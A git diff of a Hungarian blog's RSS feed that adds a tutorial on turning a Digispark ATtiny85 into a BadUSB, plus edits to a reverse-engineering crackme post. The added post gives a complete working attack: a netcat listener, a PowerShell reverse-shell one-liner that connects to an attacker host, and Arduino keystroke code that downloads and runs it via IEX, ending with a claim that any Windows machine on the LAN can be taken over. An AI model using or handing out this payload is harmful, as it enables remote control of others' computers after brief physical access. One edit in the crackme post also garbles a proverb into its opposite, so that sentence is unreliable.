@@ -6,8 +6,75 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>hu</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 17 Jul 2024 17:53:55 +0200</lastBuildDate>
+        <lastBuildDate>Tue, 23 Jul 2024 19:22:46 +0200</lastBuildDate>
         <atom:link href="http://localhost:1313/hu/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Csak egy ártatlan pendrive</title>
+            <link>http://localhost:1313/hu/posts/2024/07/csak-egy-%C3%A1rtatlan-pendrive/</link>
+            <pubDate>Tue, 23 Jul 2024 19:22:46 +0200</pubDate>
+            
+            <guid>http://localhost:1313/hu/posts/2024/07/csak-egy-%C3%A1rtatlan-pendrive/</guid>
+            <description>Filmekben lehet látni olyat, hogy a titkosügynökök a számítógépbe dugnak egy pendrive-ot és utána történik a varázslat. Ez is valami ehhez hasonló.</description>
+            <content type="html"><![CDATA[<p>Bedugod, eltelik 5 másodperc, megtörténik a varázs és kihúzod. Nem, ez most nem az forgatókönyv amire gondolsz, ez történik a USB Rubber Ducky-hez hasonló mikrokontrollerek használatakor. Lényegében a számítógép ilyenkor ezeket az eszközöket HID-ként, azaz Human Interface Device-ként kezeli, mint például egy billentyűzetet is. Ez azt engedi meg, hogy lényegében az USB bedugása után elindul az arra feltöltött program, és elkezdi gépelni ezerrel azt, mindeközben az operációs rendszer teljes engedelmességet tanusít. Első kérdés az lenne, hogy ezt miért teheti meg, miért nem kér a számítógép jogosultságot? Billentyűzetben is megbízik a számítógép, mivel ember ül mögötte nem pedig egy zsarolóprogram vagy bármi ilyesmi, és hasonló viszonyúl minden más HID-hez is, beleértve a &ldquo;badUSB&rdquo;-t is. Ezek a kis eszközök viszont sokkal gyorsabban tudnak gépelni mint egy ember, ezért a lehetőségeknek csak a kreativitás szab határt. Azt nem szabad elfelejteni, hogy talán azért nem jelent ez akkora biztonsági kockázatot, mint ahogyan én most itt felvezettem, mert egy nagyon fontos feltételnek teljesülnie kell a müködéséhez: fizikai jelenlét. Ez nagy kihívást jelenthet a legtöbb támadó fél számára, de az esély rá nem 0 tehát számolni kell vele. Olyanra is volt már példa, hogy célzottan például egy rendőrség vagy irodaház parkolójában szórtak szét ilyen kártékony USB-ket és az áldozatok, emberlétükre kiváncsiságból bedugták a szervezeti, munkai számítógépükbe és a baj meg is történt még mielőtt észrevették volna.</p>
+<p>Persze nem csak csúnya dolgokra lehet ezt használni. Ha például rendszergazdák vagyunk akkor akár a repetatív feladatokat könnyen felcserélhetjük egy bedugás és kihúzás mozdulatra ez segítségével.</p>
+<h2 id="felelősség">Felelősség</h2>
+<p>A tudás és a tapsztalat felelősséggel, és azon kötelességgel jár, hogy csak is embertársaink, és környezetünk előnyére, jólétére használhatjuk fel. Semmilyen körülmények között nem élhetünk vissza azzal a hatalommal, amelyet az élet ruházott ránk, amikor voltunk olyan szerencsések, hogy valamire rájöttünk, valamit megtanultunk. Ez különösen igaz a kiberbiztonság témakörében és még máskor is ki fogom ezt hangsúlyozni. Én az itt bemutatott technikákat csakis saját, vagy olyan rendszeren, számítógépen próbálom ki, amelyekhez engedélyt kaptam a tulajdonostól. A célom az a dokumentálás és a tanításnak a szándéka, hogy így egy biztonságosabb internet és informatika születhessen. <strong>Ezáltal szeretném tisztázni, hogy engem semmilyen felelősség nem terhel, hogy TE a saját döntéseid után ezt a tudást mire használod.</strong></p>
+<h2 id="digispark-attiny85">Digispark ATTiny85</h2>
+<p>Az alternatívát a Digispark kínálja mely egy ATTiny85 8 bites RISC utasításkészletű mikrokontrollerrel rendelkezik, amely hála a fejlesztőknek, kompatibilis az Arduino IDE fejlesztői környezettel egy kis babrálás után. Az ára rendkívül baráti a $80-hoz képest, magyarországi forgalmazók 1500 Ft környékén árulják, de ha van időd megvárni, akkor lehet hogy Aliexpressről olcsőbban be tudod szerezni. Nem promóció de <a href="https://www.hestore.hu/prod_10036419.html">itt</a> egy magyar forgalmazónál egy példa.</p>
+<p>Itt a cukiság</p>
+<p><img alt="Digispark" src="/digispark.jpg"></p>
+<h3 id="ardunio-ide-setup">Ardunio IDE setup</h3>
+<p>Az Arduino IDE-t töltsd le a hivatalos oldalról, vagy csomagkezelőddel (nekem a csomagkezelős változat hiányos volt). Mivel ez nem egy Arduino board ezér külön le kell tölteni hozzá az illesztést. Ezt az alábbi módon tudod megtenni:</p>
+<ol>
+<li>File &raquo; Prefrences &raquo; Additional board manager URLs: ide illeszd be ezt a linket <strong><a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json">https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json</a></strong> (más tutoriálokban esetleg más linket látsz az azért van mert azok még a hivatalos oldalról vannak, de sajnos nem olyan rég megszűnt a támogatás onnan, ezért kellett kiásnom a Github repo-ból ugyanarra a fájlra mutató linket).</li>
+<li>Board manager &raquo; Itt keresd meg a Digistump AVR csomagot és töltsd le.</li>
+<li>Tools &raquo; Itt a &ldquo;programmer&rdquo;-nél válaszd ki a Micronucleus-t, a &ldquo;board&rdquo;-nál pedig a Digispark 16,5 Mhz (default)-ot.</li>
+</ol>
+<p>Kész is vagy!</p>
+<h3 id="egyéb">Egyéb</h3>
+<p>Az eredeti Arduino board-okat az operációs rendszerek automatikusan ellátják a megfelelő jogosultságokkal, hogy programozhatóak legyenek, de könnyen lehet hogy neked a Digisparkot nem ismeri fel hasonlóképpen. Ennek megoldásához Linuxon a továbbiakat kell tenned:</p>
+<ol>
+<li>Hozz létre egy 49-micronucleus.rules fájlt az itt jelölt helyen: /etc/udev/rules.d/49-micronucleus.rules</li>
+<li>Másold bele ezeket a sorokat és futtasd a parancsot:
+SUBSYSTEMS==&ldquo;usb&rdquo;, ATTRS{idVendor}==&ldquo;16d0&rdquo;, ATTRS{idProduct}==&ldquo;0753&rdquo;, MODE:=&ldquo;0666&rdquo;
+KERNEL==&ldquo;ttyACM*&rdquo;, ATTRS{idVendor}==&ldquo;16d0&rdquo;, ATTRS{idProduct}==&ldquo;0753&rdquo;, MODE:=&ldquo;0666&rdquo;, ENV{ID_MM_DEVICE_IGNORE}=&ldquo;1&rdquo;</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo udevadm control --reload-rules
+</span></span></code></pre></div><h2 id="payload">Payload</h2>
+<p>Most már lehet programozni a kis cukiságot. Én példaképpen egy rendkívül egyszerű reverse shell-t fogok megvalósítani vele, a cél számítógép és a saját gépem között.</p>
+<blockquote>
+<p><strong>Reverse shell:</strong> A shell az egy médium, egy interfész a felhasználó és a vas között, ami általában parancssorba gépelt utasításokat lefordít a számítógép nyelvére, hogy aztán a kernel segítségével végrehajtódjanak. A shell az vonatkozhat egy távoli eléréssel kapcsolódott számítógépre is, erre ismert protokolok például az SSH (Secure Shell). Ilyenkor a távoli számítógép &ldquo;hallgatózik&rdquo;, hogy van-e valaki aki kapcsolatot akar teremteni vele, és ha mi akarunk az otthoni gépünkről elérni az ottani shell-t, akkor mi küldünk kérést neki. A <strong>reverse shell</strong> &ldquo;reverse&rdquo; része abból következik, hogy ilyenkor a szerepek feladata megcserélődik, a távoli gép kezdeményezi a csatlakozást. Ezt azért használják támadási vektornak mert a cél számítógép tűzfala a kimenő kéréseket nem akadályozza meg, de a bemenőeket igen. Egy ilyen reverse shell a támadónak esélyt ad, hogy fájlokat szolgáltasson ki, megteremtse a perzisztenciát, hogy ki-be tudjon járkálni kedve szerintde más sérülékenységekkel vegyítve tetszőleges célokat el tud érni vele.</p>
+</blockquote>
+<p><img alt="reverseshell" src="/reverse_shell.jpg"></p>
+<p>Én ezt a legamatőrebb módon teszem meg (ez egy egy valós szituációban nem állna meg a helyét), csupán a koncepciót és a Digispark képességeinek egy töredékét szeretném bemutatni. A lényeg az, hogy lokálisan szolgáltatom egy php szerveren a powershell scriptet, illetve &ldquo;hallgatózom&rdquo; a saját gépemen a reverse shell kérést várva. Majd a cél gépen ezt a scriptet töltjük le (az USB segítségével), amit futtatva powershell-ben, csatlakozik a &ldquo;hallgatózó&rdquo; számítógépünkhez, így megteremtve a reverse shell-t. Ezt a folyamatot egy valós helyzetben botnettel csinálná a támadó szerintem, hogy a kilétét elfedje.</p>
+<p><strong>Netcat-tel hallgatózom a 4444 porton</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nc -lp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p><strong>php szerverrel szolgáltatom azt a könyvtárat, ahol a script van</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo php -S 0.0.0.0:80 -t /directory/to/folder/of/powershellScript/
+</span></span></code></pre></div><p><strong>payload.ps1 fájl tartalma, ez a powershell script amit megosztunk</strong></p>
+<p>Változtasd meg a saját host IP címedre a &ldquo;HOST_IP_ADDRESS&rdquo;-t.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">$sm=</span><span style="color:#e6db74">(New-Object Net.Sockets.TCPClient(&#34;HOST_IP_ADDRESS&#34;,4444))</span><span style="color:#a6e22e">.GetStream</span><span style="color:#e6db74">()</span><span style="color:#a6e22e">;</span>[<span style="color:#a6e22e">byte</span>[]]<span style="color:#a6e22e">$bt=0..65535|</span><span style="color:#75715e">%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}
+</span></span></span></code></pre></div><p>Samratashok érdeme ez a kis script. <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">Github repo</a></p>
+<p>Most pedig az amit tényleg az USB fog csinálni. Ugyebár úgy kell gondolkodnunk mintha egy billentyűzetet kellene programozni előre. Ahogy már említettem ehhez az Arduino IDE segítségünkre lesz.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;DigiKeyboard.h&#34; // a header ami leegyszerűsíti a parancsok kiírását</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setup</span>() {
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">loop</span>() {
+</span></span><span style="display:flex;"><span>  DigiKeyboard.<span style="color:#a6e22e">sendKeyStroke</span>(<span style="color:#ae81ff">0</span>); <span style="color:#75715e">// az eddigi gépelést &#34;reset&#34;-eljük
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DigiKeyboard.<span style="color:#a6e22e">delay</span>(<span style="color:#ae81ff">500</span>); <span style="color:#75715e">// várást kell illetve ajánlott beiktatni, mert a számítógép sokszor nincs felkészülve a hirtelen billentyűnyomásra és esetleg figyelmenkívül hagy egy betűt, ezzel elrontva mindent akár
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DigiKeyboard.<span style="color:#a6e22e">sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT); <span style="color:#75715e">// Win + R
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DigiKeyboard.<span style="color:#a6e22e">delay</span>(<span style="color:#ae81ff">500</span>);
+</span></span><span style="display:flex;"><span>  DigiKeyboard.<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;powershell </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">IEX (New-Object Net.WebClient).DownloadString(&#39;https://mywebserver/payload.ps1&#39;);</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>); <span style="color:#75715e">// az említett script letöltése és futtatása, itt amúgy nekem itt bejelezett a Windows Defender, ezért kifinomultabb delivery módszer szükséges
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DigiKeyboard.<span style="color:#a6e22e">sendKeyStroke</span>(KEY_ENTER);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (;;) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üres ciklus, hogy ne fusson le újra a script
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Ezt a kódot feltöltjük a Micronucleus-szal a Digispark-ra és már készen is vagyunk. A saját LAN-on most már bármelyik Windows gép fölött átvehetjük az irányítást.</p>
+]]></content>
+        </item>
         
         <item>
             <title>Program visszafejtés - No. 1</title>
@@ -15,7 +82,7 @@
             <pubDate>Wed, 17 Jul 2024 17:53:55 +0200</pubDate>
             
             <guid>http://localhost:1313/hu/posts/2024/07/program-visszafejt%C3%A9s-no.-1/</guid>
-            <description>Bevezető a reverse engineering világába, csak annyit tudok mondani hogy:</description>
+            <description>Bevezető a reverse engineering világába, ahol kezdő szintű program visszafejtős feladatokat oldok meg, bemutatom a technikákat és az alapokat. Csak annyit tudok mondani hogy: &amp;ldquo;Ki itt belépsz, hagyj fel minden reménnyel.&amp;rdquo;</description>
             <content type="html"><![CDATA[<h2 id="bevezető">Bevezető</h2>
 <p>Az informatikában sok helyen hasznos lehet ha az ember beláthat a színfalak mögé. Ilyen például amikor egy kártékony programmal megtámadnak egy céget, és a hatékony védekezés érdekében, a blue team oldalán, meg akarjuk tudni az ellenség módszereit, taktikáit és procedúráit. Ekkor az említett programot elemeire kell bontani, szét kell cincálni. Ugyanakkor előfordul, hogy a másik oldalon, a red team-ben vagyunk, amikor is teljesen nemes szándékkal vezérelve, és engedéllyel a birtokunkban, megpróbálunk hibát keresni egy programban, hogy aztán azt kihasználva, érvényesítsük céljainkat.</p>
 <p>Nem lehet jobban hangsúlyozni a program visszafejtéssel elsajátítható készségek fontosságát az informatikában. A kiberbiztonság kétségkívül egy olyan ág, ahol ez különösen igaz. Nem véletlen, hogy a 3 betűs amerikai ügynökségek bizzilión mennyiségű dollárt fektetnek be ebbe az ágazatba.</p>
@@ -69,8 +136,8 @@
 <li>utána az assembly utasítások, zölddel jelölve az épp következő utasítást</li>
 </ul>
 <p>a többi annyira most nem érdekes számunkra</p>
-<p>Itt már kiszúrja a szemünket valami, egész pontosan az r8 regiszterben ez a &ldquo;isAAthisFunBBCCD&rdquo;. Potenciálisan megvan már a győztesünk, de azért kutakodjunk tovább. Amikor ilyennel foglalkozik az ember akkor általában teljesül az, hogy ha valami túl jó hogy igaz legyen akkor valószínüleg tényleg nem igaz. Ezt csak azért mondom mert ezekben a feladatokban többszőr előfordul, hogy szándékosan tesznek bele &ldquo;honeypot&rdquo;-ot, aminek kb a magyar megfelelője a mézesmadzag. Ezeket szándékosan könnyen megszerezhetővé teszik, hogy az emberek bedőljenek neki. Ennek van valós gyakorlati haszna is, rengeteg rendszerbe helyeznek el ilyen honeypot-okat, csalikat, hogy a támadó fél erőforrását, idejét vesztegesse rajta fölöslegesen. Olyakor még úgy is tud viselkedni, mint egy viharjelző, tehát ha valaki elkezdi támadni a honeypot-ot, akkor értesítést küld a védekezőknek, így időt nyerve nekik a védelemben való felkészülésnél.</p>
-<p>Vissza feladathoz, lépkedjünk a programban, ezt a <strong>stepi</strong> és <strong>nexti</strong> utasításokkal lehet a gdb-ben megcsinálni. Amikor a saját programodat debuggolod, akkor ugyanazek müködnek csak az i nélkül. Gondolom az i az &ldquo;instruction&rdquo;-nek felel meg, mivel itt assembly utasításokról van szó.</p>
+<p>Itt már kiszúrja a szemünket valami, egész pontosan az r8 regiszterben ez a &ldquo;isAAthisFunBBCCD&rdquo;. Potenciálisan megvan már a győztesünk, de azért kutakodjunk tovább. Amikor ilyennel foglalkozik az ember akkor általában teljesül az, hogy ha valami túl jó hogy igaz legyen akkor tényleg az. Ezt csak azért mondom mert ezekben a feladatokban többszőr előfordul, hogy szándékosan tesznek bele &ldquo;honeypot&rdquo;-ot, aminek kb a magyar megfelelője a mézesmadzag. Ezeket szándékosan könnyen megszerezhetővé teszik, hogy az emberek bedőljenek neki. Ennek van valós gyakorlati haszna is, rengeteg rendszerbe helyeznek el ilyen honeypot-okat, csalikat, hogy a támadó fél erőforrását, idejét vesztegesse rajta fölöslegesen. Olyakor még úgy is tud viselkedni, mint egy viharjelző, tehát ha valaki elkezdi támadni a honeypot-ot, akkor értesítést küld a védekezőknek, így több időt nyerve nekik a védelemben való felkészülésnél.</p>
+<p>Vissza feladathoz, lépkedjünk a programban, ezt a <strong>stepi</strong> és <strong>nexti</strong> utasításokkal lehet a gdb-ben megcsinálni. A stepi és a nexti közötti különbség az az, hogy az egyik belelép a függvényhívásoknál a függvényekbe a másik pedig csak átugorja. Amikor a saját programodat debuggolod, akkor ugyanazek müködnek csak a végén az i nélkül. Gondolom az i az &ldquo;instruction&rdquo;-nek felel meg, mivel itt assembly utasításokról van szó.</p>
 <p>Ekkor real-time látszik a program futása és a regisztereken a változás.</p>
 <p><img alt="gdb2" src="/crackmes5.png"></p>
 <p>Itt látszik már, hogy tényleg a feltételezett megoldásunk lesz a jó, mivel a program&hellip;.</p>
